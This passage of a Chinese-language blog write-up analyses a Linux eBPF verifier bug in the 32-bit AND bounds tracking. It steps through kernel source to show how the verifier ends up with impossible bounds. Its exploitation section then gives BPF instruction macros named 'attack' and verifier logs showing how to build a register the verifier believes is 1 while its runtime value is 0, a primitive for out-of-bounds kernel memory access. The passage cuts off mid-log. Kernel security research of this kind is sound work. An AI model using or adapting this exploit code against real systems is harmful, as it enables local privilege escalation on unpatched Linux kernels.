class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar32_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);</span><br><span class="line">  <span class="keyword">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(dst_reg-&gt;var_off);</span><br><span class="line">  s32 smin_val = src_reg-&gt;s32_min_value;</span><br><span class="line">  u32 umax_val = src_reg-&gt;u32_max_value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Assuming scalar64_min_max_and will be called so its safe</span></span><br><span class="line"><span class="comment"> * to skip updating register for known 32-bit case.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">if</span> (src_known &amp;&amp; dst_known)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We get our minimum from the var_off, since that&#x27;s inherently</span></span><br><span class="line"><span class="comment"> * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  dst_reg-&gt;u32_min_value = var32_off.value;</span><br><span class="line">  dst_reg-&gt;u32_max_value = min(dst_reg-&gt;u32_max_value, umax_val);</span><br><span class="line">  <span class="keyword">if</span> (dst_reg-&gt;s32_min_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* Lose signed bounds when ANDing negative numbers,</span></span><br><span class="line"><span class="comment"> * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    dst_reg-&gt;s32_min_value = S32_MIN;</span><br><span class="line">    dst_reg-&gt;s32_max_value = S32_MAX;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* ANDing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment"> * cast result into s64.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    dst_reg-&gt;s32_min_value = dst_reg-&gt;u32_min_value;</span><br><span class="line">    dst_reg-&gt;s32_max_value = dst_reg-&gt;u32_max_value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先<code>tnum_subreg_is_const</code>函数得到的是当前寄存器的低32位值是否是<code>known</code>的，根据函数的流程如果两个寄存器的低32位都为<code>known</code>则直接return。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);</span><br><span class="line"><span class="keyword">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);</span><br><span class="line">s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">u64 umax_val = src_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We get our minimum from the var_off, since that&#x27;s inherently</span></span><br><span class="line"><span class="comment"> * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;</span><br><span class="line">dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Lose signed bounds when ANDing negative numbers,</span></span><br><span class="line"><span class="comment"> * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* ANDing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment"> * cast result into s64.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;</span><br><span class="line">dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We may learn something more from the var_off */</span></span><br><span class="line">__update_reg_bounds(dst_reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着观察这个函数，首先则是判断了64位是否为<code>known</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);</span><br><span class="line"><span class="keyword">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);</span><br><span class="line">s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">u64 umax_val = src_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We get our minimum from the var_off, since that&#x27;s inherently</span></span><br><span class="line"><span class="comment"> * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;</span><br><span class="line">dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Lose signed bounds when ANDing negative numbers,</span></span><br><span class="line"><span class="comment"> * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* ANDing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment"> * cast result into s64.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;</span><br><span class="line">dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We may learn something more from the var_off */</span></span><br><span class="line">__update_reg_bounds(dst_reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果两个寄存器都是<code>known</code>的状态的话，那么就直接会将<code>imm</code>赋值给寄存器内的多个成员。如果是这样运行的话，那么是正常的运行的。不过可以看到的是这个<code>scalar32_min_max_and</code>函数中取<code>known</code>的函数使用的是<code>tnum_subreg_is_const</code>，然而这个函数只会验证低32位的<code>mask</code>值，如果此时存在以下两个寄存器会是这样的效果。<code>R1=&#123;.value=0x1, .mask=0xffffffff00000000&#125;</code>，<code>R2=&#123;.value=0x100000002, .mask=0x0&#125;</code>如果两个寄存器进行and运算的话，那么结果就为<code>R1=&#123;.value=0x0, .mask=0x100000000&#125;</code>。此时在<code>scalar32_min_max_and</code>函数中是会直接<code>return</code>的，随后立马进入<code>scalar_min_max_and</code>函数中，并且因为<code>dst_known = 0</code>导致不会进入<code>if</code>语句，进入下面的流程。最终会进入到<code>scalar32_min_max_and</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg32_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(reg-&gt;var_off);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">reg-&gt;s32_min_value = <span class="keyword">max_t</span>(s32, reg-&gt;s32_min_value,</span><br><span class="line">var32_off.value | (var32_off.mask &amp; S32_MIN));</span><br><span class="line"><span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">reg-&gt;s32_max_value = <span class="keyword">min_t</span>(s32, reg-&gt;s32_max_value,</span><br><span class="line">var32_off.value | (var32_off.mask &amp; S32_MAX));</span><br><span class="line">reg-&gt;u32_min_value = <span class="keyword">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);</span><br><span class="line">reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,</span><br><span class="line"> (u32)(var32_off.value | var32_off.mask));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg64_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">reg-&gt;smin_value = <span class="keyword">max_t</span>(s64, reg-&gt;smin_value,</span><br><span class="line">reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MIN));</span><br><span class="line"><span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">reg-&gt;smax_value = <span class="keyword">min_t</span>(s64, reg-&gt;smax_value,</span><br><span class="line">reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MAX));</span><br><span class="line">reg-&gt;umin_value = max(reg-&gt;umin_value, reg-&gt;var_off.value);</span><br><span class="line">reg-&gt;umax_value = min(reg-&gt;umax_value,</span><br><span class="line">      reg-&gt;var_off.value | reg-&gt;var_off.mask);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">__update_reg32_bounds(reg);</span><br><span class="line">__update_reg64_bounds(reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个函数就是对<code>dst_reg</code>进行了两次更新边界的效果，这里主要关注32位的处理。首先将有符号的最小值赋值为有符号的最小值和真实值中的最大值，然后就是将有符号的最大值赋值为有符号的最大值和真实值中最小值。后面无符号和上述类似。</p><p>依旧按照上面的例子来看，因为在<code>scalar32_min_max_and</code>函数中并没有对32位的边界值做任何初始化所以最终的效果为最小边界值为1，最大边界值为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> ___mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">reg-&gt;var_off = tnum_const(imm);</span><br><span class="line">reg-&gt;smin_value = (s64)imm;</span><br><span class="line">reg-&gt;smax_value = (s64)imm;</span><br><span class="line">reg-&gt;umin_value = imm;</span><br><span class="line">reg-&gt;umax_value = imm;</span><br><span class="line"></span><br><span class="line">reg-&gt;s32_min_value = (s32)imm;</span><br><span class="line">reg-&gt;s32_max_value = (s32)imm;</span><br><span class="line">reg-&gt;u32_min_value = (u32)imm;</span><br><span class="line">reg-&gt;u32_max_value = (u32)imm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark the unknown part of a register (variable offset or scalar value) as</span></span><br><span class="line"><span class="comment"> * known to have the value @imm.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Clear id, off, and union(map_ptr, range) */</span></span><br><span class="line"><span class="built_in">memset</span>(((u8 *)reg) + <span class="keyword">sizeof</span>(reg-&gt;type), <span class="number">0</span>,</span><br><span class="line">       offsetof(struct bpf_reg_state, var_off) - <span class="keyword">sizeof</span>(reg-&gt;type));</span><br><span class="line">___mark_reg_known(reg, imm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_reg_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="params"><span class="function">   struct bpf_insn *insn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">off_reg.type = SCALAR_VALUE;</span><br><span class="line">__mark_reg_known(&amp;off_reg, insn-&gt;imm);</span><br><span class="line">src_reg = &amp;off_reg;</span><br><span class="line"><span class="keyword">if</span> (ptr_reg) <span class="comment">/* pointer += K */</span></span><br><span class="line">  <span class="keyword">return</span> adjust_ptr_min_max_vals(env, insn,</span><br><span class="line">                                 ptr_reg, src_reg);</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码就是给<code>src_reg</code>进行了初始化，可以看到其有符号无符号最大值最小值都被赋值为了1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__update_reg_bounds(dst_reg);</span><br><span class="line">__reg_deduce_bounds(dst_reg);</span><br><span class="line">__reg_bound_offset(dst_reg);</span><br></pre></td></tr></table></figure><p>并且在<code>adjust_scalar_min_max_vals</code>函数的末尾会进行如下操作，首先又会执行<code>__update_reg_bounds</code>函数更新一下边界值，计算一下会发现其实结果并不会改变。不过如果此时我们再次构造一个最小边界值为0，最大边界值为1，并且运行时值为0的寄存器，再让两个寄存器相加。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar32_min_max_add</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">s32 smin_val = src_reg-&gt;s32_min_value;</span><br><span class="line">s32 smax_val = src_reg-&gt;s32_max_value;</span><br><span class="line">u32 umin_val = src_reg-&gt;u32_min_value;</span><br><span class="line">u32 umax_val = src_reg-&gt;u32_max_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (signed_add32_overflows(dst_reg-&gt;s32_min_value, smin_val) ||</span><br><span class="line">    signed_add32_overflows(dst_reg-&gt;s32_max_value, smax_val)) &#123;</span><br><span class="line">dst_reg-&gt;s32_min_value = S32_MIN;</span><br><span class="line">dst_reg-&gt;s32_max_value = S32_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">dst_reg-&gt;s32_min_value += smin_val;</span><br><span class="line">dst_reg-&gt;s32_max_value += smax_val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;u32_min_value + umin_val &lt; umin_val ||</span><br><span class="line">    dst_reg-&gt;u32_max_value + umax_val &lt; umax_val) &#123;</span><br><span class="line">dst_reg-&gt;u32_min_value = <span class="number">0</span>;</span><br><span class="line">dst_reg-&gt;u32_max_value = U32_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">dst_reg-&gt;u32_min_value += umin_val;</span><br><span class="line">dst_reg-&gt;u32_max_value += umax_val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则会进入这样一个函数中，计算一下便会发现不会出现<code>overflow</code>的情况，所以走的都是else，那么在相加之后<code>dst_reg</code>的最大边界值和最小边界值都为1了。此时回到<code>adjust_scalar_min_max_vals</code>函数时又会调用<code>__reg_bound_offset</code>函数，然而经过计算可以得到的是他会将寄存器的值改为1，那么此时我们就算成功获得了一个在运行时寄存器的值为0但是在<code>verifier</code>中认定其值为1的寄存器了。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>不难看出来目前的情况就很类似d3bpf了，不过稍有不同的是这里运行时和<code>verifier</code>中的值和题目中的正好相反，不过想要构造成一摸一样的也是很简单的，<code>(reg + 1) &amp; 1</code>即可构造出一摸一样的情况的了。</p><p>首先通过上述办法构造出最小边界值为1，最大边界值为0的寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(map_fd)                                                       \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_9, 0xffffffff),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_9, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_9),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">19</span>: (<span class="number">5f</span>) r6 &amp;= r7</span><br><span class="line"><span class="number">20</span>: R0_w=invP0 R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span>m</span><br></pre></td></tr></table></figure><p>最终根据前面的理论可以得到一下内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(map_fd)                                                       \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_9, 0xffffffff),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_9, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_9),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7),                        \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_3, 1, 2),                             \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0x196082),                                  \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_3),                        \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">20</span>: (<span class="number">79</span>) r3 = *(u64 *)(r8 +<span class="number">0</span>)</span><br><span class="line"> R0_w=invP0 R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R1=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">21</span>: R0_w=invP0 R3_w=invP(id=<span class="number">0</span>) R6_w=invP(id=<span 